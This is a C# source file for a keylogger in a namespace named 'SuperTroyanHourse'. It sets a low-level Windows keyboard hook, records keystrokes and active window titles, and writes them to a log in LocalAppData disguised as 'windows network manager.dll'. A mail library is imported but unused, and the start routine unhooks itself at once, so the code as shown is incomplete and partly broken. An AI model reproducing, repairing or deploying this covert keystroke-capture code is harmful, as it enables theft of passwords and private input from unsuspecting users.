using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
namespace SuperTroyanHourse
{
    class keylogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static int lastTimeInt;
        private static string lastWindowTitle = "";
        private static string lastLanguage = "";
        private static string pathToFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\\windows network manager.dll"; // Application.StartupPath + @"\log.txt"
        private static string username = Environment.UserName;

        private static void start()
        {
            var handle = GetConsoleWindow();


            _hookID = SetHook(_proc);
            UnhookWindowsHookEx(_hookID);
        }

        private static int DateTimeToInt()
        {
            return DateTime.Now.Millisecond +
                DateTime.Now.Second * 1000 +
                DateTime.Now.Minute * 60000;
        }

        #region key logger

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                StreamWriter sw = new StreamWriter(pathToFile, true);
                if (DateTimeToInt() - lastTimeInt > 2000)
                {
                    string currentWinTitle = GetActiveWindowTitle();

                    //MessageBox.Show(currentKeyboard);
                    if (currentWinTitle != lastWindowTitle)
                    {
                        sw.WriteLine();
                        lastWindowTitle = currentWinTitle;
                        sw.WriteLine("** window title: " + lastWindowTitle);
                    }
                    sw.WriteLine();
                    sw.Write(Key2Str(vkCode) + " ");
                }
                else
                    sw.Write(Key2Str(vkCode) + " ");
                lastTimeInt = DateTimeToInt();
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static string Key2Str(int vkCode)
        {
            switch ((Keys)vkCode)
            {
                case Keys.Enter: return "<enter>";
                case Keys.Tab: return "<tab>";
                case Keys.Space: return "<space>";
                case Keys.Decimal: return ".";
                case Keys.OemBackslash: return @"\";
                case Keys.Oemcomma: return ",";
                case Keys.OemMinus: return "<->";
                case Keys.OemOpenBrackets: return "(";
                case Keys.OemPeriod: return ".";
                case Keys.Oem5: return "\\";
                default: return ((Keys)vkCode).ToString();
            }
        }

        #endregion key logger

        #region get the window title

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder(nChars);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        #endregion get the window title

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
    }
}
